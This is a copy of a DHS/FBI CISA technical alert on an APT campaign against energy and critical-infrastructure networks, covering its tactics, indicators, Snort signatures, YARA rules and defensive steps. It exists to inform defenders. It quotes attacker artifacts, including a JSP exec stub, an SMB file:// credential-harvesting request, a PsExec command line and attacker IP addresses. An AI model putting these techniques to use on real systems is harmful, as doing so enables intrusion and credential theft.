{
    "title": "advanced persistent threat activity targeting energy and other critical infrastructure sectors _ cisa",
    "text": "Official website of the Department of Homeland Security\nHome    Site Map    FAQ    Contact Us    Traffic Light Protocol    PCII    Accountability    Disclaimer    Privacy Policy    FOIA    No Fear Act    Accessibility Plain Writing Plug-\nins    Inspector General    The White House    USA.gov\n \nCISA is part of the Department of Homeland Security\nAbout Us Alerts and Tips Resources Industrial Control Systems Report\nNational Cyber Awareness System  > Alerts  > Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors\nMore Alerts\nAlert (TA17-293A)\nAdvanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors\nOriginal release date: October 20, 2017 | Last revised : March 15, 2018\nSystems Affected\nDomain Controllers\nFile Servers\nEmail Servers\nOverview\nThis alert has been superseded by newer information. The old alert is provided below for historical reference only. For the newest version, please\nsee TA18-074A .\n \nThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert\nprovides information on advanced persistent threat (APT) actions targeting government entities and organizations in the energy, nuclear, water, aviation, and critical\nmanufacturing sectors. Working with U.S. and international partners, DHS and FBI identified victims in these sectors. This report contains indicators of compromise (IOCs)\nand technical details on the tactics, techniques, and procedures (TTPs) used by APT actors on compromised victims’ networks.\n \nDHS assesses this activity as a multi-stage intrusion campaign by threat actors targeting low security and small networks to gain access and move laterally to networks of\nmajor, high value asset owners within the energy sector. Based on malware analysis and observed IOCs, DHS has confidence that this campaign is still ongoing, and threat\nactors are actively pursuing their ultimate objectives over a long-term campaign. The intent of this product is to educate network defenders and enable them to identify\nand reduce exposure to malicious activity.\nFor a downloadable copy of IOC packages and associated files, see:\nTA17-293A_TLP_WHITE.csv\nTA17-293A_TLP_WHITE_stix.xml\nMIFR-10127623_TLP_WHITE.pdf\nMIFR-10127623_TLP_WHITE_stix.xml\nMIFR-10128327_TLP_WHITE.pdf\nMIFR-10128327_TLP_WHITE_stix.xml\nMIFR-10128336_TLP_WHITE.pdf\nMIFR-10128336_TLP_WHITE_stix.xml\nMIFR-10128830 ​_TLP_WHITE.pdf\nMIFR-10128830 ​_TLP_WHITE_stix.xml\nMIFR-10128883_TLP_WHITE.pdf\nMIFR-10128883_TLP_WHITE_stix.xml\nMIFR-10135300_TLP_WHITE.pdf\nMIFR-10135300_TLP_WHITE_stix.xml\nContact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.\nDescription\nSince at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases,\nhave leveraged their capabilities to compromise victims’ networks. Historically, cyber threat actors have targeted the energy sector with various results, ranging from cyber\nespionage to the ability to disrupt energy systems in the event of a hostile conflict. [1] Historically, threat actors have also targeted other critical infrastructure sectors with\nsimilar campaigns.\nAnalysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy\nsector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. [2]\nThis campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third party\nsuppliers with less secure networks. The initial victims are referred to as “staging targets” throughout this alert. The threat actor uses the staging targets’ networks as\npivot points and malware repositories when targeting their final intended victims. The ultimate objective of the cyber threat actors is to compromise organizational\nnetworks, which are referred throughout this alert as “intended target.”\nTechnical Details\nThe threat actors in this campaign employed a variety of TTPs, including:\nopen-source reconnaissance,\nspear-phishing emails (from compromised legitimate accounts),\nwatering-hole domains,\nhost-based exploitation,\nindustrial control system (ICS) infrastructure targeting, and\nongoing credential gathering.\nUsing Cyber Kill Chain for Analysis\nDHS leveraged the Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery,\nexploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of activity within this framework.\nStage 1: Reconnaissance\nThe threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting\nrelationships with many of the intended targets. It is known that threat actors are actively accessing publicly available information hosted by organization-monitored\nnetworks. DHS further assesses that threat actors are seeking to identify information pertaining to network and organizational design, as well as control system\ncapabilities, within organizations.\nForensic analysis identified that threat actors are conducting open-source reconnaissance of their targets, gathering information posted on company-controlled websites.\nThis is a common tactic for collecting the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially\ninformation that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a\npublically accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status\ninformation in the background.\nAnalysis also revealed that the threat actors used compromised staging target networks to conduct open-source reconnaissance to identify potential targets of interest\nand intended targets. “Targets of interest” refers to organizations that DHS observed the threat actors showing an active interest in, but where no compromise was\nreported. Specifically, the threat actors accessed publically web-based remote access infrastructure such as websites, remote email access portals, and virtual private\nnetwork (VPN) connections.\nStage 2: Weaponization\nSpear-Phishing Email TTPs\nThroughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote\nserver using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//<remote IP address>/Normal.dotm). As a part of the standard processes\nexecuted by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server prior to retrieving the requested\nfile. (Note: It is not necessary for the file to be retrieved for the transfer of credentials to occur.) The threat actors then likely used password-cracking techniques to obtain\nthe plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.\nStage 3: Delivery\nWhen seeking to compromise the target network, threat actors used a spear-phishing email campaign that differed from previously reported TTPs. The spear-phishing\nemail used a generic contract agreement theme, with the subject line “AGREEMENT & Confidential”, and which contained a generic PDF document, titled “’’document.pdf”.\n(Note the inclusion of two single apostrophes at the beginning of the attachment name.) The PDF itself was not malicious and did not contain any active code. The\ndocument prompted the user to click on a link should a download not automatically begin. (Note: No code within the PDF initiated a download.) The link directs users to a\nwebsite via a shortened URL, which may prompt them to retrieve a malicious file.\nIn previous reporting, DHS and FBI identified the common themes used in these spear-phishing emails, all emails referred to control systems or process control systems.\nThe threat actors continue to use these themes, specifically against intended target organizations. Email messages include references to common industrial control\nequipment and protocols. The emails leveraged malicious Microsoft Word attachments that appear to be legitimate résumés or curricula vitae (CVs) for industrial control\nsystems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.\nStage 4: Exploitation\nThreat actors used distinct and unusual TTPs (i.e., successive redirects) in the phishing campaign directed at staging targets. Emails contained a stacked URL-shortening\nlink that directed the user to http://bit[.]ly/2m0x8IH link, which redirected the user to http://tinyurl[.]com/h3sdqck link, which redirected the user to the ultimate\ndestination of http://imageliners[.]com/nitel. The imageliner[.]com website contained an email address and password input fields mimicking a login page for a website.\nWhen exploiting the intended targets, threat actors used malicious .docx files to capture user credentials, however, DHS did not observe the actors establishing\npersistence on the user’s system. The documents attempt to retrieve a file through a “file:\\\\” connection over SMB using Transmission Control Protocol (TCP) ports 445 or\n139 and User Datagram Protocol (UDP) ports 137 or 138. This connection is made to a command and control (C2) server — either a server owned by the threat actors or that\nof a compromised system owned by a staging location victim. When a user is authenticated as a domain user, this will provide the C2 server with the hash of the victim.\nLocal users will receive a graphical user interface (GUI) prompt to enter a username and password. This information will be provided to the C2 over TCP ports 445 or 139\nand UDP ports 137 or 138. (Note: A file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat\nactors in this campaign. [3]\nUse of Watering Hole Domains\nOne of the threat actors’ primary uses for staging targets is to develop watering holes. The threat actors compromise the infrastructure of trusted organizations to reach\nintended targets. [4] Although these watering holes may host legitimate content by reputable organizations, the threat actors have altered them to contain and reference\nmalicious content. Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical\ninfrastructure.\nUsing a similar SMB collection technique, the actors manipulated these websites by altering JavaScript and PHP files that redirect to an IP address on port 445 for\ncredential harvesting. The compromised sites include both custom developed web applications and template-based frameworks. The threat actors injected a line of code\ninto header.php, a legitimate PHP file that carried out the redirected traffic.\nThere is no indication that threat actors used zero-day exploits to manipulate the sites; the threat actors more likely used legitimate credentials to access the website\ncontent directly.\nStage 5: Installation\nThe threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication is not used. [5] Once inside of an intended target’s\nnetwork, the threat actors downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate\nextension, typically .exe or .zip.\nIn one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:\nThe threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.\nThe files were renamed to new extensions, with INST.txt being renamed INST.exe.\nThe files were executed on the host and then immediately deleted.\nThe execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of a compromised system of an intended\ntarget.\nIn their report on Dragonfly, Symantec associated the MD5 hash of INST.exe to Backdoor.Goodor. The MD5 hashes for the previously mentioned files can be found in the\nIOC list above.\nSeveral of these files were scripts that were used for creating the initial account leveraged by the threat actors. The initial script symantec_help.jsp contained a one-line\nreference to a malicious script. It was located at C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\.\nContents of symantec_help.jsp\n____________________________________________________________________________________________________________________\n<% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\<REDACTED SCRIPT NAME>\\\"\"); %>\n____________________________________________________________________________________________________________________\nThe malicious script created a user account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then\nattempted to add the newly created account to the administrators group for elevated privileges. This script contained hard-coded values for the group name\n“administrator” in Spanish, Italian, German, French, and English.\nIn addition, the threat actors also created a scheduled task “reset”, which was designed to automatically log out of their newly created account every eight hours.\nContents of Scheduled Task\n____________________________________________________________________________________________________________________\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n <RegistrationInfo>\n  <Date>2017-06-25T11:51:17.4848488</Date>\n  <Author><REDACTED></Author>\n </RegistrationInfo>\n <Triggers>\n  <TimeTrigger>\n   <StartBoundary>2017-06-25T12:30:29</StartBoundary>\n   <Enabled>true</Enabled>\n  </TimeTrigger>\n </Triggers>\n <Principals>\n  <Principal id=\"Author\">\n   <RunLevel>LeastPrivilege</RunLevel>\n   <UserId><REDACTED USERNAME></UserId>\n   <LogonType>InteractiveToken</LogonType>\n  </Principal>\n </Principals>\n <Settings>\n  <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n  <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n  <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n  <AllowHardTerminate>true</AllowHardTerminate>\n  <StartWhenAvailable>false</StartWhenAvailable>\n  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n  <IdleSettings>\n   <StopOnIdleEnd>true</StopOnIdleEnd>\n   <RestartOnIdle>false</RestartOnIdle>\n  </IdleSettings>\n  <AllowStartOnDemand>true</AllowStartOnDemand>\n  <Enabled>true</Enabled>\n  <Hidden>false</Hidden>\n  <RunOnlyIfIdle>false</RunOnlyIfIdle>\n  <WakeToRun>false</WakeToRun>\n  <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n  <Priority>7</Priority>\n </Settings>\n <Actions Context=\"Author\">\n  <Exec>\n   <Command>logoff</Command>\n  </Exec>\n </Actions>\n</Task>\n____________________________________________________________________________________________________________________\nAfter achieving access to staging targets, the threat actors installed tools to carry out their mission. On one occasion, threat actors installed the free version of Forticlient,\nwhich was presumably used as a VPN client for intended targets.\nConsistent with the perceived goal of credential harvesting, the threat actor was observed dropping and executing open source and free tools such as Hydra,\nSecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations\nsuch as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the threat actor was accessing the system. Of note, the\nthreat actor installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\<Redacted Username>\\Desktop\\OWAExchange\\.\nIn the previous folder structure, a subfolder named “out” held multiple text files.\nPersistence Through .LNK File Manipulation\nThe threat actors manipulated .lnk files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local Windows repository.\nThe threat actors exploited this built-in Windows functionality by setting the icon path to their remote controlled server. When the user browses to the directory, Windows\nattempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection.\nThe threat actors used this tactic in both Virtual Desktop Infrastructure (VDI) and traditional environments.\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nThree of the observed .lnk files were SETROUTE.lnk, notepad.exe.lnk, and Document.lnk. These names appear to be contextual, and threat actors may use a variety of\nother file names within this tactic. Two of the remote servers observed in these .lnk files were 62.8.193[.]206 and 5.153.58[.]45.\nEstablishing Local Accounts\nThe threat actors created accounts on the staging target for ongoing operations. These accounts, masquerading as legitimate service accounts, appeared to be tailored to\neach individual staging target. Each account created by the threat actors served a specific purpose in their operation. DHS and FBI identified the creation of four local\naccounts on a compromised server. The server operated as both a domain controller and an email server for a staging target.\nAccount 1:  The threat actors created a local account, which was named to mimic backup services of the staging target. This account was created by the aforementioned\nmalicious script. The threat actors used this account to conduct open-source reconnaissance and remotely access intended targets. This account was also used to remove\nthe Forticlient software.\nAccount 2:  Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.\nAccount 3:  The threat actors created Account 3 in the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while\nthe threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial\nconcatenated with the last name).\nAccount 4:  In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete the\nfollowing logs: system, security, terminal services, remote services, and audit. Registry analysis indicated that this activity was likely scripted.\nStage 6: Command and Control\nThe threat actors commonly use web shells to compromise publically available servers to gain a foothold into internal networks. This activity has been observed on both\nweb and email servers. The threat actors then establish an encrypted connection over port 443 to the web shell. Once connected, the threat actors download additional\nmalicious files from the threat actors’ servers to the publically available server. Two of the web shells (AutoDiscover.aspx and global.aspx) used by the actors are detailed\nin the accompanying IOC list. Despite having different file names, the MD5 hashes of the two web shells indicated that the two files were the same file. These web shells\nhave been associated with the ciklon_z webshell.\nDHS and FBI identified the threat actors leveraging remote access services and infrastructure, such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used\nstaging targets to connect to several intended targets, effectively turning the staging targets into command and control points. To date, it is presumed that the threat\nactors have targeted services that use single-factor authentication. DHS believes that the threat actors employ this methodology to avoid detection and attribution.\nTargeting of ICS and SCADA Infrastructure\nUpon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. Specifically, the threat actors focused on identifying\nand browsing file servers within the intended victim’s network. The threat actors viewed files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA)\nsystems. Based on DHS analysis of existing compromises, these files were originally named containing ICS vendor names and ICS reference documents pertaining to the\norganization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).\nIn one instance, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation\nfacilities. In this same incident, the threat actors created a malicious scheduled task that invoked “scr.exe” with the arguments “scr.jpg”. The MD5 hash of scr.exe matched\nthe MD5 of ScreenUtil, a tool used by the threat actor, as reported in the Symantec Dragonfly 2.0 report.\nDetection and Response\nIOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP\naddresses, domain names, file hashes, network signatures, and YARA rules provided and add the IPs to their watchlist to determine whether malicious activity has been\nobserved within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these APT actors.\nNetwork Signatures and Host-Based Rules\nThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actors TTPs. Although these network\nsignatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.\nNetwork Signatures\nalert tcp $HOME_NET any ‐> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\";\nsid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only;\nclasstype:bad‐unknown; metadata:service http;)\n___________________________________\nalert tcp $HOME_NET any ‐> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1;\nflow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad‐unknown; metadata:service http;)\n________________________________________\nalert tcp $HOME_NET any ‐> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1;\nflow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad‐unknown; metadata:service http;)\n_________________________________________\nalert tcp any any ‐> any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1;\nflow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\";\ndistance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad‐unknown; metadata:service netbios‐ssn;)\n________________________________________\nalert tcp $HOME_NET any ‐> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\";\nsid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method;\nclasstype:bad‐unknown; metadata:service http;)\n_________________________________________\nalert tcp $HOME_NET any ‐> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User‐Agent|3a 20|Go‐http‐client/1.1'\"; sid:42000005;\nrev:1; flow:established,to_server; content:\"User‐Agent|3a 20|Go‐http‐client/1.1|0d 0a|Accept‐Encoding|3a 20|gzip\"; http_header;\nfast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a‐z0‐9]{3}=[a‐z0‐9]{32}&/U\"; classtype:bad‐unknown; metadata:service http;)\n__________________________________________\nalert tcp $EXTERNAL_NET [139,445] ‐> $HOME_NET any (msg:\"SMB Server Traffic contains NTLM‐Authenticated SMBv1 Session\"; sid:42000006; rev:1;\nflow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad‐\nunknown; metadata:service netbios‐ssn;)\n \nYARA Rules\nThis is a consolidated rule set for malware associated with, consisting of rules written by US-CERT, as well as contributions by trusted partners.\n*/\n \nrule APT_malware_1\n{\nmeta:\n      description = \"inveigh pen testing tools & related artifacts\"\n      author = \"US‐CERT Code Analysis Team\"    \n      date = \"2017/07/17\"\n      hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"\n      hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"\n      hash2 = \"BA756DD64C1147515BA2298B6A760260\"\n      hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"\n      hash4 = \"04738CA02F59A5CD394998A99FCD9613\"\n      hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"\n      hash6 = \"65A1A73253F04354886F375B59550B46\"\n      hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"\n      hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"\n      hash9 = \"722154A36F32BA10E98020A8AD758A7A\"\n      hash10 = \"4595DBE00A538DF127E0079294C87DA0\"\nstrings:\n      $s0 = \"file://\"\n      $s1 = \"/ame_icon.png\"\n      $s2 = \"184.154.150.66\"\n      $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }\n      $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }\n      $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"\n      $s6 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n      $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"\n      $s8 = \"NlZzSZk=\"\n      $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"\n      $s10 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n      $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"\n      $s12 = \"ps.exe ‐accepteula \\\\%ws% ‐u %user% ‐p %pass% ‐s cmd /c netstat\"\n      $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }\n      $s14 = {\n68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }\n      $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }\n \n \n//inveigh pentesting tools\n \n      $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }\n \n//specific malicious word document PK archive\n \n      $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }\n      $s18 = {\n6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }\n      $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }\n      $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n      $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n      $s22 = \"5.153.58.45\"\n      $s23 = \"62.8.193.206\"\n      $s24 = \"/1/ree_stat/p\"\n      $s25 = \"/icon.png\"\n      $s26 = \"/pshare1/icon\"\n      $s27 = \"/notepad.png\"\n      $s28 = \"/pic.png\"\n      $s29 = \"http://bit.ly/2m0x8IH\"\n     \ncondition:\n      ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15)\nor ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or\n($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)\n}\n \nrule APT_malware_2\n{\nmeta:\n      description = \"rule detects malware\"\n      author = \"other\"\nstrings:\n      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }\n      $http_push = \"X‐mode: push\" nocase\n      $http_pop = \"X‐mode: pop\" nocase\ncondition:\n      any of them\n}\n \nrule Query_XML_Code_MAL_DOC_PT_2\n{\n      meta:\n            name= \"Query_XML_Code_MAL_DOC_PT_2\"\n            author = \"other\"\n      strings:\n            $zip_magic = { 50 4b 03 04 }\n            $dir1 = \"word/_rels/settings.xml.rels\"\n            $bytes = {8c 90 cd 4e eb 30 10 85 d7}\n      condition:\n            $zip_magic at 0 and $dir1 and $bytes\n}\n \nrule Query_Javascript_Decode_Function\n{\nmeta:\n      name= \"Query_Javascript_Decode_Function\"\n      author = \"other\"\nstrings:\n      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}\n      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E\n6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B\n29 29}\n      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C\n?? 2B 3D [1‐2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66\n72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}\n      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}\n      $func_call=\"a(\\\"\"\ncondition:\n      filesize < 20KB and #func_call > 20 and all of ($decode*)\n}\n \nrule Query_XML_Code_MAL_DOC\n{\nmeta:\n      name= \"Query_XML_Code_MAL_DOC\"\n      author = \"other\"\nstrings:\n      $zip_magic = { 50 4b 03 04 }\n      $dir = \"word/_rels/\" ascii\n      $dir2 = \"word/theme/theme1.xml\" ascii\n      $style = \"word/styles.xml\" ascii\ncondition:\n      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd\n}\nImpact\nThis APT actor’s campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.\nSolution\nDHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.\nNetwork and Host-based Signatures\nDHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to\ntheir watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network\nhas experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to\nidentify malicious activity.\nDetections and Prevention Measures\nUsers and administrators can detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the\nIOC packages to the following locations:\nnetwork intrusion detection system/network intrusion protection system  logs,\nweb content logs,\nproxy server logs,\ndomain name server resolution logs,\npacket capture (PCAP) repositories,\nfirewall logs,\nworkstation Internet browsing history logs,\nhost-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,\ndata loss prevention logs,\nexchange server logs,\nuser mailboxes,\nmail filter logs,\nmail content logs,\nAV mail logs,\nOWA logs,\nBlackberry Enterprise Server logs, and\nMobile Device Management logs.\nTo detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following\nlocations:\napplication logs,\nIIS/Apache logs,\nfile system,\nintrusion detection system/ intrusion prevention system logs,\nPCAP repositories,\nfirewall logs, and\nreverse proxy.\nDetect spear-phishing by searching workstation file systems, as well as network-based user directories, for attachment filenames and hashes found in the IOC\npackages.\nDetect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.\nDetect evasion techniques by the threat actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows\nsystem logs.\nDetect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.\nDetect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be\nreviewed by the account owners.\nDetect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.\nDetect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.\nDetect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.\nDetect persistence on servers by searching system logs for all filenames listed in the IOC packages.\nDetect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires\nPowerShell version 5, and PowerShell logging must be enabled prior to the activity.)\nDetect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.\nDetect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”.\nServices\\MaxInstanceCount” and the value of “REG_DWORD 1” at location\n“HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.\nDetect installation by searching all proxy logs for downloads from URIs without domain names.\nGeneral Best Practices Applicable to this Campaign:\nPrevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137.\nSee the NCCIC/US-CERT publication on SMB Security Best Practices for more information.\nBlock the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.\nMonitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).\nDeploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and\ndownloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on\nthe host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.\nSegment any critical networks or control systems from business systems and networks according to industry best practices.\nEnsure adequate logging and visibility on ingress and egress points.\nEnsure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands\nan attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for\nmonitoring and analysis. See the FireEye blog post Greater Visibility through PowerShell Logging for more information.\nImplement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – Compromised Web Servers and Web Shells – Threat\nAwareness and Guidance .\nEstablish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators\nof phishing. End users should have clear instructions on how to report unusual or suspicious emails.\nImplement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft 